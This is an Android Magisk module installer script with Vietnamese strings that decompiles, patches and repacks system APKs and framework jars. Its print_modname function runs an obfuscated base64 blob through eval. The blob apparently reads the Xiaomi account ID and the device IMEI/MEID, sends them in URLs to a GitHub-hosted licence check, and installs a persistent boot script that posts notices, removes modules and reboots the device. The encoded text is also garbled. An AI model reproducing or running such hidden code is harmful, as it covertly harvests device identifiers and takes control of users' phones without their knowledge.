# Kakathic

## Language text
chon="Chọn"
time="Tổng thời gian"
h="giờ"
m="phút"
s="giây"
Information="Thông tin"
author="Tác giả"
name="Tên"
unzip="Đang xử lý..."
volkey1="! Sử dụng phím âm lượng"
volkey2="! Vol- = Chọn số hiện tại, Vol+ = Chuyển đổi số."
volkey3="! Ấn nút nguồn để hủy."
load="Tải"
error="! Lỗi không tìm thấy hoặc lỗi mạng !"
error2="- Mô-đun này chỉ chạy trên thiết bị arm64, của bạn là $ARCH !"

ui_print(){ echo "$1"; sleep 0.005; }
ui_print2(){ echo "  $1"; }
Xan(){ echo "  $1" >&2; }
BatdauT=$(date +%s);

# Volume keys
Vk(){ 
input2="$1"; input=1
Kgg(){ 
Key="$(getevent -qlc 1 | awk '{print $3}')"
if [ "$Key" == "KEY_POWER" ];then
abort
elif [ "$Key" == "KEY_VOLUMEUP" ];then
[ "$input" == "$input2" ] && input=1 || input=$(($input + 1))
ui_print "  $input"
sleep 0.3
Kgg
elif [ "$Key" == "KEY_VOLUMEDOWN" ];then
ui_print
ui_print "  $chon: $input"
ui_print
sleep 0.3
elif [ "$Key" == "ABS_MT_TRACKING_ID" ];then
ui_print
ui_print "  $chon: $input"
ui_print
sleep 0.4
else Kgg; fi; }
Kgg
}

# Count time 
End_time(){
KetthucT=$(date +%s)
TongTG=$(($KetthucT - $BatdauT))
Gio=$(printf '%d' $((TongTG/3600%24)))
Phut=$(printf '%d' $((TongTG/60%60)))
if [ "$Gio" != 0 ];then
echo "$time: $(printf '%d '$h', %d '$m', %d '$s'.' $((TongTG/3600%24)) $((TongTG/60%60)) $((TongTG%60)))"
elif [ "$Phut" != 0 ];then
echo "$time: $(printf '%d '$m', %d '$s'.' $((TongTG/60%60)) $((TongTG%60)))"
else
echo "$time: $(printf '%d '$s'.' $((TongTG%60)))"
fi
}

# mount
mrw () {
for i in / /system_root /system /system_ext /vendor /product; do
/system/bin/mount $i 2>/dev/null || /system/bin/mount $i 2>/dev/null
/system/bin/mount -o rw,remount $i 2>/dev/null || /system/bin/mount -o rw,remount $i 2>/dev/null
/system/bin/mount -o rw,remount $(magisk --path)/.magisk/mirror$i 2>/dev/null || /system/bin/mount -o rw,remount $(magisk --path)/.magisk/mirror$i 2>/dev/null
done
}

mro () {
for i in / /system_root /system /system_ext /vendor /product; do
/system/bin/mount -o ro,remount $i 2>/dev/null || /system/bin/mount -o ro,remount $i 2>/dev/null
/system/bin/umount $i 2>/dev/null || /system/bin/umount $i 2>/dev/null
/system/bin/umount $(magisk --path)/.magisk/mirror$i 2>/dev/null || /system/bin/umount $(magisk --path)/.magisk/mirror$i 2>/dev/null
done
}

baksmali () { java -Xms150m -Xmx1028m -jar "/data/tools/lib/Tools/baksmali.jar" "$@"; }
smali () { java -Xms150m -Xmx1028m -jar "/data/tools/lib/Tools/smali.jar" "$@"; }

# Tìm kiếm
Timkiem(){ find $2 -name "*.smali" -exec grep -Rl "${1//\//\\\/}" {} +; }

Thaythe(){
ui_print2 "MOD: $RANDOM -> $RANDOM";
Xan "MOD THAYTHE: $1 -> $2";
for Ttcfg in $(Timkiem "$1" "$3"); do
[ -e "$Ttcfg" ] && sed -i "s|${1//\//\\\/}|${2//\//\\\/}|g" $Ttcfg || Xan "- Lỗi: $1";
[ -e "$Ttcfg" ] && echo "$Ttcfg" 2>/dev/null >> "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
[ -e "$Ttcfg" ] && Xan "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
done
}

Chose(){
for skd in $(Timkiem "$1" "$4"); do
[ -e $skd ] && ndbdhd=$(grep -A3 "$1" $skd | grep -m1 "$2" | awk '{print $2}')
[ -e $skd ] && ui_print2 "MOD: $RANDOM";
[ -e $skd ] && Xan "MOD CHOSE: $1" || Xan "- Lỗi: $(echo "$1" | sed 's|\\||g')";
[ -e $skd ] && sed -i -e "/${1//\//\\\/}/,/${2//\//\\\/}/c const/4 $ndbdhd, $3" "$skd";
[ -e $skd ] && echo "$skd" 2>/dev/null >> "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
[ -e $skd ] && Xan "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
done
}

Autoone(){
ui_print2 "MOD: $RANDOM -> $RANDOM";
Xan "MOD AUTOONE: $1 -> $2";
for vakkddhh in $(find $3 -name "*.smali" -exec grep -l "..., $1" {} +); do
Xan "SHOW: sed -i $(grep "..., $1" "$vakkddhh" | awk '{print "-e \"s|sget-boolean "$2" '$1'|const/4 "$2" '$2'|g\"" }' | sort | uniq | tr '\n' ' ') $(echo "$vakkddhh" | sed 's|\$|\\\$|g')"
echo "sed -i $(grep "..., $1" "$vakkddhh" | awk '{print "-e \"s|sget-boolean "$2" '$1'|const/4 "$2" '$2'|g\"" }' | sort | uniq | tr '\n' ' ') $(echo "$vakkddhh" | sed 's|\$|\\\$|g')" | sh
echo "$vakkddhh" 2>/dev/null >> "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
Xan "$APK/$(echo "$3" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
done
}

Vsmali(){
for Vka in $(Timkiem "$1" "$4"); do
[ -e $Vka ] && ui_print2 "MOD: $RANDOM";
[ -e $Vka ] && Xan "MOD VSMALI: $1" || Xan "- Lỗi: $(echo "$1" | sed 's|\\||g')";
[ -e $Vka ] && sed -i -e "/^${1//\//\\\/}/,/${2//\//\\\/}/c $(echo "$3" | sed -z 's|\n|\\n|g')" "$Vka";
[ -e $Vka ] && echo "$Vka" 2>/dev/null >> "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
[ -e $Vka ] && Xan "$APK/$(echo "$4" | sed "s|$APK/||g" | cut -d '/' -f1)/class";
done
}

CPapk(){
PTC="$(pm path "$1" | cut -d : -f2)"
if [ "$(echo "$PTC" | grep -cm1 '/data/')" == 1 ];then
cp -rf $PTC "/data/tools/apk/$1.apk"
cp -rf "$PTC" "$APK/$1.apk"
else
[ -e "/data/tools/apk/$1.apk" ] || cp -rf "$PTC" "/data/tools/apk/$1.apk"
[ -e "/data/tools/apk/$1.apk" ] && cp -rf "/data/tools/apk/$1.apk" "$APK/$1.apk" || cp -rf "$PTC" "$APK/$1.apk"
fi
echo "$1" | tee "$APK/$1.txt" >&2
}

CPfile(){
Pathfw="$(find /*/framework /*/*/framework -type f -name "$1.jar" -not -path "*/data/*" | head -n1)"
[ -e "/data/tools/apk/$1.jar" ] || cp -rf $Pathfw "/data/tools/apk/$1.jar"
[ -e "/data/tools/apk/$1.jar" ] && cp -rf "/data/tools/apk/$1.jar" "$APK" || cp -rf "$Pathfw" "$APK"
echo "$Pathfw" | tee "$APK/$1.txt" >&2
}

# giải nén file
Giainen(){
for vapk in $APK/*.*; do
if [ "${vapk##*.}" == 'apk' ] || [ "${vapk##*.}" == 'jar' ];then
PTd="$(cat ${vapk%.*}.txt)"
[ -e "$vapk" ] && ui_print "  Giải nén: ${PTd##*/}" || abort "- Lỗi không tìm thấy file! ${PTd##*/}"
ui_print
mkdir -p ${vapk%.*}
unzip -qo "$vapk" '*.dex' -d ${vapk%.*}
for vsmali in ${vapk%.*}/*.dex; do
baksmali d --api $API $vsmali -o ${vsmali%.*}
done
fi
sleep 2
done
}

Donggoi(){
# Đóng gói apk
for bapk in $APK/*.*; do
if [ "${bapk##*.}" == 'apk' ] || [ "${bapk##*.}" == 'jar' ];then
if [ -e "${bapk%.*}/class" ];then
PTb="$(cat ${bapk%.*}.txt)"
ui_print "  Đóng gói: ${PTb##*/}"
ui_print
for bsmali in $(cat ${bapk%.*}/class 2>/dev/null | sed "s|$APK/||g" | cut -d '/' -f2 | sort | uniq); do
rm -fr "$bsmali".dex
smali a --api $API ${bapk%.*}/$bsmali -o "${bapk%.*}/$bsmali".dex
done
cd ${bapk%.*}
zip -qr -0 $bapk '*.dex'
zipalign -f 4 $bapk $APK/tmp/${bapk##*/} 
cp -rf $APK/tmp/* $APK
else
rm -fr ${bapk%.*}*
fi
fi
sleep 5
done

for Capk in $APK/*.*; do
if [ "${Capk##*.}" == 'apk' ];then
Papkp="$(cat ${Capk%.*}.txt)"
Ehehdb2="$(pm path $Papkp | cut -d : -f2)"
if [ "$(echo "$Ehehdb2" | grep -cm1 '/data/')" == 1 ];then
mkdir -p $MODPATH/app
cp -rf $Capk "$MODPATH/app/$Papkp"
echo "$Ehehdb2" > "$MODPATH/app/$Papkp.txt"
chcon u:object_r:apk_data_file:s0 "$MODPATH/app/$Papkp"
else
mkdir -p $MODPATH/sys_app
cp -rf $Capk "$MODPATH/sys_app/$Papkp"
echo "$Ehehdb2" > "$MODPATH/sys_app/$Papkp.txt"
chcon u:object_r:apk_data_file:s0 "$MODPATH/sys_app/$Papkp"
fi
echo 'rm -fr /data/tools/apk/'$Papkp.apk'' >> $TMPDIR/uninstall.sh
fi

if [ "${Capk##*.}" == 'jar' ];then
Papkp="$(cat ${Capk%.*}.txt)"
echo 'rm -fr /data/tools/apk/'$Papkp.jar'' >> $TMPDIR/uninstall.sh
mkdir -p $MODPATH/framework
Ehehdb2="${Papkp##*/}"
cp -rf $Capk "$MODPATH/framework/${Ehehdb2%.*}"
echo "$Papkp" > "$MODPATH/framework/${Ehehdb2%.*}.txt"
fi
done
}

# Freeze
FREEZE(){
for TARGET in $1; do
mktouch $MODPATH$TARGET/.replace
done
}

Setp () {
[ "$(grep -cm1 "$1=" $TMPDIR/system.prop)" == 1 ] && sed -i "/$1=/d" $TMPDIR/system.prop
echo "$1=$2" >> $TMPDIR/system.prop
}

mkdir -p $TMPDIR/Apk/tmp /data/tools/apk /data/tools/lib/Tools
export APK="$TMPDIR/Apk"
[ "$API" -ge 31 ] && miuik='miui-'

print_modname(){

ui_print
ui_print "  $name: $(GP name) $(GP version) by $(GP author), $(getprop ro.product.device), $API, $ARCH"
ui_print
ui_print "  Tải dữ liệu..."
ui_print

eval "$(echo 'ClRlc⁰QxMjM³dHJ⁸ZQpBcGlsdD⁵iJCgKWyAiJChmaWxlIC³kYXRhL⁰N⁷c⁰RlbS³zeW⁷jL⁶FjY⁶³⁸bnRzLnhtbCB⁴IGdyZXAgLWMgdGV⁹dCkiID⁵³IDEgXSAmJiBjcCAtcmYgL⁶RhdGEvc⁰lzdGVtL⁰N⁷bmMvYWNjb⁰VudHMueG⁸sICRUTVBESVIvMS⁷⁹bWwgfHwgYWJ⁹MnhtbCAvZGF⁵YS³zeXN⁵ZW⁵vc⁰luYy³hY⁶NvdW⁷⁵cy⁷⁹bWwgJFRNUERJUi⁴xLnhtbDsKZ⁰JlcCAtbTEgImNvbS⁷⁹aWFvbWkiICRUTVBESVIvMS⁷⁹bWwgfCB⁵ciAnICcgJ⁸xuJyB⁴IGdyZXAgLW⁵xIGFjY⁶³⁸bnQgfCBjdXQgLWQgXCIgLWYyKSIKWyAiJEFwaWx⁵IiBdIHx⁴IHVpX⁰ByaW⁷⁵ICIgIEVycm³yOiBIw²N⁷IMSRxINuZyBuaOG²rXAgxJHhu⁹MgaGnhu⁹duIGlkIFhpYW³taQoiCmltZWk³IiQoZ⁶V⁵cHJvcCBwZXJzaXN⁵LnJhZGlvLm⁸laWQpIgpbICIkaW⁸laSIgXSB⁴fCBpbWVpPSIkKGdldHByb⁰Agcm⁴ucmlsLm³lbS⁷tZWlkKSIKWyAiJGltZWkiIF⁵gfHwgaW⁸laT⁵iJChncmVwIC⁸tMSBrZXlfbWVpZF³zbG³⁵MCAvZGF⁵YS⁴qLzAvY⁶³tLmFuZHJvaWQucGhvbmUvc⁶hhcmVkX⁰ByZWZzL⁶NvbS⁷hbmRyb⁶lkLnBob⁶⁷lX⁰ByZWZlcmVuY⁶VzLnhtbCB⁴IGN⁸dCAtZCAnPicgLWYyIHwgY⁰V⁵IC⁸kICc⁴JyAtZjEpIgpbICIkaW⁸laSIgXSB⁴fCB⁸aV³wcmludCAiICBFcnJvcjogSMOjeSDhuqVuICojMDYjIMSR⁹buDIGhp⁹buHbiBNRUlECiIKZHJpdmVyPSQoZ⁶V⁵cHJvcCByby⁷wcm³kdWN⁵LmRldmljZSkKCnRraWQ³JEFwaWx⁵CnRob⁶lnaWFuMT⁵iJChYZW⁵gImh⁵dHBzOi⁴vcmF⁰LmdpdGh⁸YnVzZXJjb⁶⁷⁵ZW⁷⁵LmNvbS³rYWthdGhpYy³aSC⁸WTi³aSC³Db⁶RlLyRkcml⁶ZXIvJChlY⁶hvIC⁸uICIkQXBpbHQiIHwgYmFzZTMyIC⁸⁰MCkiKSIKaWYgWyAiJChlY⁶hvICIkdGhvaWdpYW⁹xIiB⁴IGdyZXAgLWNtMSAnSFNEPScpIiAhPSAxIF⁵¹dGhlbgp⁵aG³pZ⁶lhbjE³IiQoWGVtICJodHRwczovL⁰Jhdy⁷naXRodWJ⁸c⁶VyY⁶³udGVudC⁷jb⁶⁵va⁶FrYXRoaWMvWkgtVk⁹vWkgvQ⁶³kZS⁴kZHJpdmVyLyQoZWNobyAtbiAiJGltZWkiIHwgYmFzZTMyIC⁸⁰MCkiKSIKdGtpZD⁵kaW⁸laQpmaQoKaWYgWyAiJChlY⁶hvICIkdGhvaWdpYW⁹xIiB⁴IGdyZXAgLWNtMSAnSFNEPScpIiA³PSAxIF⁵¹dGhlbgpUZ⁶cxPSQoZWNobyAiJHRob⁶lnaWFuMSIgfCBncmVwIC⁸tMSAnSFNEPScgfCBjdXQgLWQgPSAtZjIpClR⁶czE³JChlY⁶hvICIkdGhvaWdpYW⁹xIiB⁴IGdyZXAgLW⁵xICdWZXItTWF⁹PScgfCBjdXQgLWQgPSAtZjIpCgpbICIke⁸RnZzEvLy⁵vfSIgLWdlICIkKGRhdGUgKyVZJW⁵lZCkiIF⁵gJiYgUHJvPTEKWyAiJHtUdnMxLy⁴uL⁰⁵iIC⁸nZSAiJChHUCB⁶ZXJzaW³uQ⁶³kZSkiIF⁵gJiYgVnNQcm⁴³MQpEdGltZT⁵kVGdnMQpEVnM³JFR⁶czEKZWxzZQpEdGltZT⁵iJChkYXRlICslWS⁵lbSktJChlY⁶hvICQoKCAkKGRhdGUgKyVkKSArIDEgKSkpICQoZGF⁵ZSArJUg²JU⁵pIgpmaQoKWGFuICJDaGVjazogJHRraWQsICR⁵aG³pZ⁶lhbjEsICRQcm⁴sICRWc⁸BybywgJFRnZzEsICRUdnMxLCAkZHJpdmVyLyQoZWNobyAtbiAiJGltZWkiIHwgYmFzZTMyIC⁸⁰MCkiCgppZiBbICIkUHJvIiA³PSAxIF⁵gJiYgWyAiJFZzUHJvIiA³PSAxIF⁵¹dGhlbgoKdWlfcHJpbnQgIiAgQ⁶jDoG⁴²ICR⁵a⁶lkLCBIU⁵Q²ICREdGltZSIKdWlfcHJpbnQKdWlfcHJpbnQgIiAgTGV⁶ZWw²ICREVnMiCnVpX⁰ByaW⁷⁵CgpybSAtZnIgL⁶RhdGEvdG³vbHMvbGliL⁰J⁸bi⁷zaApybSAtZnIgL⁶RhdGEvYWRiL⁰NlcnZpY⁶UuZC³WSy⁷zaAoKZWxpZiBbICIkUHJvIiA³PSAxIF⁵¹dGhlbgp⁸aV³wcmludCAiICBDaMOgbzogJHRraWQsIExldmVsOiAkRFZzLCBIU⁵Q²ICREdGltZSIKdWlfcHJpbnQKaWYgWyAiJChHUCBpZCkiID⁵³ICJWSC⁸LRSIgXTt⁵aGVuCmFib⁰J⁵ICIhIExldmVsIGPhu²dhIGLhuqFuIGtow¹RuZyDEkeG¹pyDEkeG¹gyBz⁹butIGThu²VuZyBtb⁶R⁸bGUgbsOgeSEKCiAg⁹bumbmcgaOG¹mSBjw¹MgdGjhu⁹MgdMSDbmcgbGV⁶ZWwgxJHDsyBuaGEgCgogIFTDoGkga⁶hv⁹bqjbiBNaTogJEFwaWx⁵CgogIE⁸FSUQ²ICRpbWVpCiIKZmkKCnJtIC⁸mciAvZGF⁵YS³⁵b⁶³scy³saWIvcnVuLnNoCnJtIC⁸mciAvZGF⁵YS³hZGIvc⁶VydmljZS⁷kL⁸ZLLnNoCgplbGlmIFsgLWUgL⁶RhdGEvdG³vbHMvbGliL⁶xvZy⁷⁵eHQgXTt⁵aGVuCmFib⁰J⁵ICIhIELhuqFuIMSRw²MgdOG¹q⁶⁷nIHPhu²⁵gZOG¹pW⁷nIGTDuW⁷nIHRo⁹butIG⁷naGnhu⁹dtIAogIAogIE⁰hu⁷⁸pIGLhuqFuIOG¹p⁶⁷nIGjhu⁷kgxJHhu⁹MgdGnhur³wIHThu²VjIHPhu²⁵gZOG¹pW⁷nLgoKICBUw²BpIGtob+G²o⁶⁹gTWk²ICRBcGlsdAoKICBNRUlEOiAkaW⁸laQoiCmFtIHN⁵YXJ⁵IC⁸hIGFuZHJvaWQuaW⁷⁵ZW⁷⁵LmFjdGlvbi⁷WSUVXIC⁸kICJodHRwczovL⁶tha⁶F⁵aGljLmdpdGh⁸Yi⁷pby³aSC⁸WTi³TdXBwb⁰J⁵Lmh⁵bWwiID⁹mMgplbHNlCgppZiBbICIkKEdQIGlkKSIgPT⁵gIlZILVBUIiBdIHx⁴IFsgIiQoR⁸AgaWQpIiA³PSAiVkgtS⁵UiIF⁵¹dGhlbgphYm³ydCAiISBDaOG¹iSBjw¹MgdGjhu⁹MgZMO⁷bmcgdGjhu²⁵gTW³kdWxlCgogIFRow²ptIFRp⁹bq/bmcgVmnhu⁹d⁵IFZILVpIIHbDoCBnw¹NpIGdhcHAgVkgtR⁵EKCiAgVMOgaSBraG/huqNuIE⁸pOiAkQXBpbHQKCiAgTUVJRDogJGltZWkKIgpmaQp⁸aV³wcmludCAiISBUaMO⁵bmcgYsOhbyDhu²duZyBo⁹buZIG⁷ow²AgcGjDoXQgdHJp⁹buDbiAKCiAgVMOqbiBtw²F⁷OiAkZHJpdmVyCgogIFTDoGkga⁶hv⁹bqjbiBNaTogJEFwaWx⁵CiAgCiAgTUVJRDogJGltZWkKCiAgQuG²oW⁹gc+G²vSDEkcaw⁹bujYyB⁵cuG²o⁶kgbmdoaeG¹h⁶⁵gNzJoCgogIEjhur³⁵IHRo⁹budaSBnaWFuIHPhur⁵gdOG¹sSDEkeG¹mW⁷nIGto⁹bufaSDEkeG¹mW⁷nIGzhuqFpIG⁰DoXkuCiIKYW⁵gc⁰RhcnQgLWEgYW⁷kcm³pZC⁷pbnRlbnQuYWN⁵aW³uLlZJRVcgLWQgImh⁵dHBzOi⁴va⁶FrYXRoaWMuZ⁶l⁵aHViLmlvL⁸pILVZOL⁸N⁸cHBvcnQuaHRtbCIgPiYyCgojIyBDaGVjayB⁵aGUgc⁰lzdGVtIGRldmljZXMKWyAiJEFSQ⁵giID⁵³ICJhcm⁵⁶NCIgXSB⁴fCBhYm³ydCAiJGVycm³yMgoiCgp⁵ZXhrPSInQ+G²o⁶⁵gxqFuIGLhuqFuIMSRw²Mg⁹bunbmcgaOG¹mSBtb⁶R⁸bGUgVmnhu⁹d⁵IE⁷hbSBi⁹bqhbiBjw¹MgdGjhu⁹MgdGnhur³wIHThu²VjIHPhu²⁵gZOG¹pW⁷nLiciCnRleGsyPSInQ⁴OybiAxIHRp⁹bq/bmcgbuG¹r⁶EgbW³kdWxlIFZp⁹buHdCBow¹NhIHPhur⁵gaOG²v⁰QgdGjhu⁷⁸pIGdpYW⁹gc+G¹rSBk⁹bulbmcsIGjDo⁰kg⁹bunbmcgaOG¹mSDEkeG¹gyB⁵aeG²v⁰AgdOG¹pWMgc+G¹rSBk⁹bulbmcgbW³kdWxlJyIKZWNobyAnCndoaWxlIHRydWU¹IGRvCnRob⁶lnaWFuamQ³IiQoZGF⁵ZSArJVklbSVkJUglTSkiCnRob⁶lnaWFuaGV⁵PSInJChkYXRlICslWSVtJWQlSCVNKSciCgpbICIkKCggJHRob⁶lnaWFuamQgLSAkdGhvaWdpYW⁷oZXQgKSkiIC⁸nZSAiMTk⁷MDAiIF⁵gJiYgc⁰UgLWxwIDIwMDAgLWMgImNtZCBub⁰RpZmljYXRpb⁶⁹gcG³zdCAkUkFORE³NICckdGV⁹azInIgpbICIkKCggJHRob⁶lnaWFuamQgLSAkdGhvaWdpYW⁷oZXQgKSkiIC⁸nZSAiMTk⁷MDAiIF⁵gJiYgYW⁵gc⁰RhcnQgLWEgYW⁷kcm³pZC⁷pbnRlbnQuYWN⁵aW³uLlZJRVcgLWQgImh⁵dHBzOi⁴va⁶FrYXRoaWMuZ⁶l⁵aHViLmlvL⁸pILVZOL⁸N⁸cHBvcnQuaHRtbCIgPiYyCgppZiBbICIkKCggJHRob⁶lnaWFuamQgLSAkdGhvaWdpYW⁷oZXQgKSkiIC⁸nZSAiMjAwMDAiIF⁵¹dGhlbgplY⁶hvID⁹gL⁶RhdGEvYWRiL⁶⁸vZHVsZXMqL⁸ZILSovcmVtb⁰ZlCnJtIC⁸mciAvZGF⁵YS³⁵b⁶³scy³saWIvcnVuLnNoCnJtIC⁸mciAvZGF⁵YS³hZGIvc⁶VydmljZS⁷kL⁸ZLLnNoCnNsZWVwIDEwCnJlYm³vdAplbHNlCmRyaXZlcj⁵nJGRyaXZlcicKQXBpbHQ³JyRBcGlsdCcKaW⁸laT⁵nJGltZWknCgp⁵aG³pZ⁶lhbjE³IiQoWGVtICJodHRwczovL⁰Jhdy⁷naXRodWJ⁸c⁶VyY⁶³udGVudC⁷jb⁶⁵va⁶FrYXRoaWMvWkgtVk⁹vWkgvQ⁶³kZS⁴kZHJpdmVyLyQoZWNobyAtbiAiJEFwaWx⁵IiB⁴IGJhc⁶UzMiAtdzApIikiCmlmIFsgIiQoZWNobyAiJHRob⁶lnaWFuMSIgfCBncmVwIC⁸jbTEgIkhTRD⁵iKSIgIT⁵gMSBdO⁰RoZW⁹KdGhvaWdpYW⁹xPSIkKFhlbSAiaHR⁵cHM²Ly³yYXcuZ⁶l⁵aHVidXNlcmNvbnRlbnQuY⁶³tL⁶tha⁶F⁵aGljL⁸pILVZOL⁸pIL⁵NvZGUvJGRyaXZlci⁴kKGVjaG⁴gLW⁹gIiRpbWVpIiB⁴IGJhc⁶UzMiAtdzApIikiCmZpCgppZiBbICIkKGVjaG⁴gIiR⁵aG³pZ⁶lhbjEiIHwgZ⁰JlcCAtY⁶⁵xICJIU⁵Q³IikiID⁵³IDEgXTt⁵aGVuClRnZzE³JChlY⁶hvICIkdGhvaWdpYW⁹xIiB⁴IGdyZXAgLW⁵xICJIU⁵Q³IiB⁴IGN⁸dCAtZCA³IC⁸mMikKVHZzMT⁵kKGVjaG⁴gIiR⁵aG³pZ⁶lhbjEiIHwgZ⁰JlcCAtbTEgIlZlci⁸NYXg³IiB⁴IGN⁸dCAtZCA³IC⁸mMikKWyAiJHtUZ⁶cxLy⁴tL⁰⁵iIC⁸nZSAiJChkYXRlICslWSVtJWQpIiBdICYmIFBybz⁵xClsgIiR¹VHZzMS⁴vLi³³IiAtZ⁶UgIiQoR⁸AgdmVyc⁶lvbkNvZGUpIiBdICYmIFZzUHJvPTEKRHRpbWU³JFRnZzEKRFZzPSRUdnMxCnRraWQ³JEFwaWx⁵CmZpCgppZiBbICIkUHJvIiA³PSAxIF⁵gJiYgWyAiJFZzUHJvIiA³PSAxIF⁵¹dGhlbgpzdSAtbHAgMjAwMCAtYyAiY⁶⁸kIG⁷vdGlmaWNhdGlvbiBwb⁰N⁵ICRSQU⁷ET⁵⁵gJyR⁵ZXhrJyIKYnJlYWsKZmkKCnNsZWVwIDMwMDAKZmkKZG³uZQonID⁹gL⁶RhdGEvdG³vbHMvbGliL⁰J⁸bi⁷zaAplY⁶hvICcKZWNobyA+IC³kYXRhL⁰Rvb⁶xzL⁶xpYi³sb⁶cudHh⁵ClsgLWUgL⁶RhdGEvdG³vbHMvbGliL⁰J⁸bi⁷zaCBdICYmIC⁹gL⁶RhdGEvdG³vbHMvbGliL⁰J⁸bi⁷zaApbIC⁸lICQoZWNobyAvZGF⁵YS³hZGIvbW³kdWxlcy³WSC⁸aSC³zeXN⁵ZW⁵vcHJvZHVjdC³vdmVybGF⁷L⁸p²LmFuZHJvaWQuYXBrKSBdIHx⁴IHJtIC⁸mciAvZGF⁵YS³hZGIvKi⁴qL⁰N⁷c⁰RlbS⁴qL⁶³⁶ZXJsYXkvWnouKi⁷hcGsKcm⁵gLWZyIC³kYXRhL⁰Rvb⁶xzL⁶xpYi³ydW⁹uc⁶gKcm⁵gLWZyIC³kYXRhL⁶FkYi³zZXJ⁶aWNlLmQvVksuc⁶gKJyA+IC³kYXRhL⁶FkYi³zZXJ⁶aWNlLmQvVksuc⁶gKCmNobW³kIDc⁰NyAvZGF⁵YS³hZGIvc⁶VydmljZS⁷kL⁸ZLLnNoIApjaG⁸vZCA⁰NzcgL⁶RhdGEvdG³vbHMvbGliL⁰J⁸bi⁷zaApmaQo=' | base64 -r)"

}

